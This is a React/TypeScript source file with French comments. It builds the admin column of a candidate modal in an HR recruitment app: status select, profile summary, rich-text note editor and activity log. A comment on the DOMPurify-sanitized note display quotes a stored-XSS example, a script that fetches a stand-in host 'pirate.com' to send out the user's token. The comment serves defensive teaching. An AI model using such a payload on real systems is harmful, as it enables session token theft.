// ============================================================
// CandidateAdminPanel.tsx — Colonne droite de la modale candidat
// ============================================================
//
// CE FICHIER CONTIENT :
//   1. RichNoteEditor      — éditeur de note riche (sous-composant interne)
//   2. CandidateAdminPanel — colonne droite complète (export par défaut)
//
// RESPONSABILITÉ DE CE FICHIER :
// Tout ce qui se trouve dans la colonne droite de la modale :
//   — Select de changement de statut
//   — Résumé rapide du profil (contrat, compétences, formations...)
//   — Éditeur de note interne avec formatage riche
//   — Affichage de la note précédente (protégée XSS)
//   — Journal d'activité récente (horodatage relatif)
//
// POURQUOI RichNoteEditor est DANS ce fichier ?
// Il est utilisé uniquement ici. L'extraire dans un fichier séparé
// n'apporterait aucun avantage — la règle d'extraction est :
// "un composant mérite son propre fichier quand il est réutilisé
// dans au moins 2 endroits distincts".
//
// SÉCURITÉ : dangerouslySetInnerHTML + DOMPurify.sanitize()
// sont TOUJOURS utilisés ensemble dans ce fichier.
// Voir l'explication détaillée dans la section Notes internes.
// ============================================================

import React, { useState, useCallback, useMemo, useRef } from 'react';
import {
    Col, Select, Divider, Tag, Avatar,
    Badge, Space, Typography, Switch, Button, Tooltip, message,
} from 'antd';
import {
    UserOutlined, TeamOutlined, LockOutlined, EyeOutlined,
    BoldOutlined, ItalicOutlined, UnderlineOutlined,
    OrderedListOutlined, UnorderedListOutlined, SendOutlined,
} from '@ant-design/icons';
import DOMPurify from 'dompurify';
import dayjs     from 'dayjs';
import relativeTime from 'dayjs/plugin/relativeTime';
import 'dayjs/locale/fr';

// Types, constantes et interfaces importés depuis useCandidateActions
import type { AdminPanelProps, RichNoteEditorProps } from '../../../hooks/useCandidateActions';
import { STATUT_CONFIG } from '../../../hooks/useCandidateActions';
import { PRIMARY } from '../../../theme/colors';

// Configuration dayjs — plugins nécessaires pour fromNow() en français
dayjs.extend(relativeTime);
dayjs.locale('fr');

const { Text } = Typography;

// ════════════════════════════════════════════════════════════
// SOUS-COMPOSANT : RichNoteEditor
//
// Éditeur de texte enrichi basé sur contentEditable.
//
// POURQUOI useRef et pas useState pour le contenu ?
// contentEditable est géré DIRECTEMENT par le DOM natif.
// Si on utilisait useState :
//   frappe → setState → re-render React → réconciliation Virtual DOM
//   → le curseur de l'éditeur peut SAUTER à la fin du texte.
// useRef donne une référence directe au nœud DOM SANS provoquer
// de re-render — le DOM est la source de vérité pour l'éditeur.
// On lit innerHTML uniquement quand nécessaire (handleInput).
//
// ⚠️ LIMITATION CONNUE : document.execCommand() est déprécié
// par le W3C depuis 2016. Il fonctionne encore dans tous les
// navigateurs modernes par compatibilité, mais sera retiré à terme.
// Alternative professionnelle : TipTap (https://tiptap.dev) ou Quill.js.
// Pour un PFE avec contrainte de temps, execCommand reste acceptable.
// ════════════════════════════════════════════════════════════

const RichNoteEditor: React.FC<RichNoteEditorProps> = React.memo(({
    onChange, visibility, onVisibilityChange, onSave, saving,
}) => {
    // Référence directe au div[contentEditable] — sans re-render
    const editorRef = useRef<HTMLDivElement>(null);

    /**
     * Applique une commande de formatage sur la sélection courante.
     * execCommand('bold') = gras, execCommand('italic') = italique, etc.
     * Après application, on lit innerHTML et on remonte au parent via onChange.
     */
    const execCommand = useCallback((cmd: string, val?: string) => {
        document.execCommand(cmd, false, val);
        if (editorRef.current) onChange(editorRef.current.innerHTML);
        editorRef.current?.focus();
    }, [onChange]);

    /** Lit innerHTML à chaque frappe et remonte la valeur au parent. */
    const handleInput = useCallback(() => {
        if (editorRef.current) onChange(editorRef.current.innerHTML);
    }, [onChange]);

    /**
     * Détecte "@" pour la fonctionnalité de mention de manager.
     * Actuellement un placeholder — à brancher sur la liste des managers
     * RH de l'entreprise via un dropdown de suggestions.
     */
    const handleKeyUp = useCallback((e: React.KeyboardEvent) => {
        if (e.key === '@') {
            message.info('Fonctionnalité @ mention — à connecter à la liste des managers');
        }
    }, []);

    /**
     * Boutons du toolbar définis comme tableau de configuration.
     * useMemo([]) = calculé UNE seule fois car aucune dépendance variable.
     * Évite de recréer ce tableau à chaque render de RichNoteEditor.
     */
    const toolbarBtns = useMemo(() => [
        { icon: <BoldOutlined />,         cmd: 'bold',                title: 'Gras'            },
        { icon: <ItalicOutlined />,        cmd: 'italic',              title: 'Italique'        },
        { icon: <UnderlineOutlined />,     cmd: 'underline',           title: 'Souligné'        },
        { icon: <UnorderedListOutlined />, cmd: 'insertUnorderedList', title: 'Liste'           },
        { icon: <OrderedListOutlined />,   cmd: 'insertOrderedList',   title: 'Liste numérotée' },
    ], []);

    const highlightColors = ['#fff3cd', '#d4edda', '#f8d7da', '#cce5ff'];

    return (
        <div style={{
            border:       '1px solid #e8e8e8',
            borderRadius: 10,
            overflow:     'hidden',
            background:   '#fff',
            boxShadow:    '0 1px 6px rgba(0,0,0,0.06)',
        }}>

            {/* ── Toolbar de formatage ── */}
            <div style={{
                display:      'flex',
                alignItems:   'center',
                gap:          4,
                padding:      '8px 10px',
                background:   '#fafafa',
                borderBottom: '1px solid #f0f0f0',
                flexWrap:     'wrap',
            }}>
                {toolbarBtns.map(btn => (
                    <Tooltip key={btn.cmd} title={btn.title}>
                        <Button
                            type="text"
                            size="small"
                            icon={btn.icon}
                            onClick={() => execCommand(btn.cmd)}
                            style={{ color: '#595959', borderRadius: 4 }}
                        />
                    </Tooltip>
                ))}

                <Divider type="vertical" style={{ height: 18, margin: '0 4px' }} />

                {/* Pastilles de couleur de surlignage */}
                {highlightColors.map(color => (
                    <Tooltip key={color} title="Surligner">
                        <button
                            onClick={() => execCommand('hiliteColor', color)}
                            style={{
                                width:        18,
                                height:       18,
                                borderRadius: 4,
                                background:   color,
                                border:       '1px solid #d9d9d9',
                                cursor:       'pointer',
                                padding:      0,
                                flexShrink:   0,
                            }}
                        />
                    </Tooltip>
                ))}

                <Divider type="vertical" style={{ height: 18, margin: '0 4px' }} />

                {/* Bouton mention @ */}
                <Tooltip title="Taper @ pour mentionner un manager">
                    <Button
                        type="text"
                        size="small"
                        icon={<TeamOutlined />}
                        onClick={() => {
                            editorRef.current?.focus();
                            document.execCommand('insertText', false, '@');
                            if (editorRef.current) onChange(editorRef.current.innerHTML);
                        }}
                        style={{ color: PRIMARY, fontWeight: 600, fontSize: 13 }}
                    >
                        @
                    </Button>
                </Tooltip>
            </div>

            {/* ── Zone de saisie contentEditable ── */}
            <div
                ref={editorRef}
                contentEditable
                suppressContentEditableWarning
                onInput={handleInput}
                onKeyUp={handleKeyUp}
                style={{
                    minHeight:  120,
                    maxHeight:  200,
                    overflowY:  'auto',
                    padding:    '12px 14px',
                    fontSize:   13,
                    lineHeight: 1.7,
                    color:      '#262626',
                    outline:    'none',
                }}
                data-placeholder="Ajouter une observation sur ce profil... (@ pour mentionner)"
            />

            {/* ── Footer : visibilité + bouton Enregistrer ── */}
            <div style={{
                display:        'flex',
                justifyContent: 'space-between',
                alignItems:     'center',
                padding:        '8px 12px',
                background:     '#fafafa',
                borderTop:      '1px solid #f0f0f0',
                gap:            8,
                flexWrap:       'wrap',
            }}>
                <Space size={6}>
                    {/*
                      * Switch controlled : checked dépend de visibility (prop).
                      * onChange remonte la nouvelle valeur au parent via onVisibilityChange.
                      * Le parent (CandidateAdminPanel) détient l'état — pattern "controlled".
                      */}
                    <Switch
                        size="small"
                        checked={visibility === 'shared_manager'}
                        onChange={v => onVisibilityChange(v ? 'shared_manager' : 'rh_only')}
                        style={{ background: visibility === 'shared_manager' ? PRIMARY : '#d9d9d9' }}
                    />
                    <span style={{ fontSize: 12, color: '#595959' }}>
                        {visibility === 'shared_manager' ? (
                            <Space size={4}>
                                <EyeOutlined style={{ color: PRIMARY }} />
                                Visible par le manager
                            </Space>
                        ) : (
                            <Space size={4}>
                                <LockOutlined style={{ color: '#8c8c8c' }} />
                                RH uniquement
                            </Space>
                        )}
                    </span>
                </Space>

                <Button
                    type="primary"
                    size="small"
                    loading={saving}
                    icon={<SendOutlined />}
                    onClick={onSave}
                    style={{ background: PRIMARY, borderColor: PRIMARY, borderRadius: 6 }}
                >
                    Enregistrer
                </Button>
            </div>

            {/*
              * CSS pseudo-placeholder pour contentEditable.
              * <input> a un attribut placeholder natif, pas contentEditable.
              * On le simule via CSS ::before + l'attribut data-placeholder.
              * :empty = s'applique quand le div est vide (aucun contenu).
              */}
            <style>{`
                [contenteditable]:empty:before {
                    content: attr(data-placeholder);
                    color: #bfbfbf;
                    pointer-events: none;
                }
            `}</style>
        </div>
    );
});
RichNoteEditor.displayName = 'RichNoteEditor';

// ════════════════════════════════════════════════════════════
// COMPOSANT PRINCIPAL : CandidateAdminPanel
// ════════════════════════════════════════════════════════════

const CandidateAdminPanel: React.FC<AdminPanelProps> = React.memo(({
    candidate,
    currentStatut,
    onStatutChange,
    savingNote,
    onSaveNote,
}) => {
    // États locaux de l'éditeur — gérés ici, pas dans CandidateModal
    const [noteText,       setNoteText]       = useState('');
    const [noteVisibility, setNoteVisibility] = useState<'rh_only' | 'shared_manager'>('rh_only');

    /**
     * Options du Select de statut mémorisées.
     * STATUT_CONFIG est une constante (jamais modifiée) → useMemo([]).
     * Sans useMemo, un nouveau tableau d'objets JSX serait créé
     * à chaque render, forçant Ant Design Select à recalculer ses options.
     */
    const statutOptions = useMemo(() =>
        Object.entries(STATUT_CONFIG).map(([val, cfg]) => ({
            value: val,
            label: (
                <Space>
                    <Badge color={cfg.color} />
                    {cfg.label}
                </Space>
            ),
        })),
    []);

    /**
     * Déclenche la sauvegarde de note puis vide l'éditeur.
     * onSaveNote est la fonction du hook useCandidateActions
     * qui fait l'appel API et gère les erreurs.
     */
    const handleSave = useCallback(async () => {
        await onSaveNote(noteText, noteVisibility);
        setNoteText('');
    }, [noteText, noteVisibility, onSaveNote]);

    return (
        <Col
            span={7}
            style={{
                padding:    '28px 20px',
                background: '#f9fafb',
                height:     '92vh',
                overflowY:  'auto',
                borderLeft: '1px solid #f0f0f0',
            }}
        >
            {/* ── 1. Statut de la candidature ── */}
            <div style={{ marginBottom: 24 }}>
                <div style={{
                    fontSize:      11,
                    fontWeight:    700,
                    letterSpacing: 1.2,
                    color:         '#8c8c8c',
                    marginBottom:  10,
                    textTransform: 'uppercase',
                }}>
                    Statut de la candidature
                </div>
                {/*
                  * Pattern "controlled component" :
                  * value = currentStatut (état géré dans useCandidateActions via le hook)
                  * onChange remonte la sélection → hook → API → mise à jour optimiste
                  */}
                <Select
                    value={currentStatut}
                    onChange={onStatutChange}
                    style={{ width: '100%' }}
                    options={statutOptions}
                />
            </div>

            <Divider style={{ margin: '0 0 20px' }} />

            {/* ── 2. Résumé rapide ── */}
            <div style={{ marginBottom: 24 }}>
                <div style={{
                    fontSize:      11,
                    fontWeight:    700,
                    letterSpacing: 1.2,
                    color:         '#8c8c8c',
                    marginBottom:  10,
                    textTransform: 'uppercase',
                }}>
                    Résumé
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 12, color: '#595959' }}>
                    {candidate.contract_type_preferred && (
                        <div>
                            <Text type="secondary">Contrat : </Text>
                            <Tag color="blue" style={{ borderRadius: 6 }}>
                                {candidate.contract_type_preferred}
                            </Tag>
                        </div>
                    )}
                    {candidate.nationalite && (
                        <div>
                            <Text type="secondary">Nationalité : </Text>
                            {candidate.nationalite}
                        </div>
                    )}
                    {candidate.skills && candidate.skills.length > 0 && (
                        <div>
                            <Text type="secondary">Compétences : </Text>
                            {candidate.skills.length} renseignées
                        </div>
                    )}
                    {candidate.experiences && candidate.experiences.length > 0 && (
                        <div>
                            <Text type="secondary">Expériences : </Text>
                            {candidate.experiences.length} poste(s)
                        </div>
                    )}
                    {candidate.formations && candidate.formations.length > 0 && (
                        <div>
                            <Text type="secondary">Formations : </Text>
                            {candidate.formations.length} diplôme(s)
                        </div>
                    )}
                    {candidate.has_cv && (
                        <div>
                            <Text type="secondary">CV : </Text>
                            <Tag color="green" style={{ borderRadius: 6 }}>Disponible</Tag>
                        </div>
                    )}
                </div>
            </div>

            <Divider style={{ margin: '0 0 20px' }} />

            {/* ── 3. Notes internes ── */}
            <div>
                <div style={{
                    fontSize:      11,
                    fontWeight:    700,
                    letterSpacing: 1.2,
                    color:         '#8c8c8c',
                    marginBottom:  12,
                    textTransform: 'uppercase',
                }}>
                    Notes internes
                </div>

                <RichNoteEditor
                    value={noteText}
                    onChange={setNoteText}
                    visibility={noteVisibility}
                    onVisibilityChange={setNoteVisibility}
                    onSave={handleSave}
                    saving={savingNote}
                />

                {/*
                  * ⚠️ SÉCURITÉ CRITIQUE — dangerouslySetInnerHTML :
                  *
                  * Cette prop injecte du HTML brut dans le DOM.
                  * La note vient de la base de données — si un utilisateur
                  * malveillant a pu y écrire :
                  *   <script>fetch('https://pirate.com?t='+localStorage.getItem('token'))</script>
                  * ce script s'exécuterait dans le navigateur du RH
                  * qui consulte la note → vol de token (attaque XSS STOCKÉE).
                  *
                  * DOMPurify.sanitize() analyse le HTML et supprime :
                  *   — toutes les balises <script>
                  *   — tous les attributs d'événement (onclick, onerror, onload...)
                  *   — tous les liens javascript://
                  *
                  * RÈGLE : dangerouslySetInnerHTML est TOUJOURS accompagné
                  * de DOMPurify.sanitize() dans ce projet. Sans ça, REFUS en code review.
                  */}
                {candidate.notes_internes && (
                    <div style={{
                        marginTop:    16,
                        padding:      '10px 14px',
                        background:   '#fffdf0',
                        border:       '1px solid #ffe58f',
                        borderRadius: 8,
                        fontSize:     12,
                        color:        '#595959',
                    }}>
                        <div style={{ fontWeight: 600, marginBottom: 6, color: '#8c6914' }}>
                            Note précédente :
                        </div>
                        <div
                            dangerouslySetInnerHTML={{
                                __html: DOMPurify.sanitize(candidate.notes_internes),
                            }}
                        />
                    </div>
                )}
            </div>

            <Divider style={{ margin: '20px 0' }} />

            {/* ── 4. Journal d'activité récente ── */}
            <div>
                <div style={{
                    fontSize:      11,
                    fontWeight:    700,
                    letterSpacing: 1.2,
                    color:         '#8c8c8c',
                    marginBottom:  12,
                    textTransform: 'uppercase',
                }}>
                    Activité récente
                </div>
                <div style={{ fontSize: 12, color: '#595959' }}>

                    {/* Réception de la candidature (toujours présent) */}
                    <div style={{ display: 'flex', gap: 10, marginBottom: 12 }}>
                        <Avatar
                            size="small"
                            icon={<UserOutlined />}
                            style={{ background: PRIMARY, flexShrink: 0 }}
                        />
                        <div>
                            <strong>Système</strong> a reçu la candidature
                            <div style={{ color: '#bfbfbf', fontSize: 11 }}>
                                {/*
                                  * dayjs().fromNow() = horodatage relatif :
                                  * "il y a 3 jours", "il y a 2 heures", "il y a 1 minute"
                                  * Nécessite le plugin relativeTime + locale('fr') configurés en haut.
                                  */}
                                {candidate.created_at
                                    ? dayjs(candidate.created_at).fromNow()
                                    : '—'}
                            </div>
                        </div>
                    </div>

                    {/* Dernière modification par le RH (conditionnel) */}
                    {candidate.date_derniere_modification && (
                        <div style={{ display: 'flex', gap: 10 }}>
                            <Avatar
                                size="small"
                                icon={<UserOutlined />}
                                style={{ background: '#8B5CF6', flexShrink: 0 }}
                            />
                            <div>
                                <strong>RH</strong> a modifié la candidature
                                <div style={{ color: '#bfbfbf', fontSize: 11 }}>
                                    {dayjs(candidate.date_derniere_modification).fromNow()}
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            </div>
        </Col>
    );
});

CandidateAdminPanel.displayName = 'CandidateAdminPanel';
export default CandidateAdminPanel;
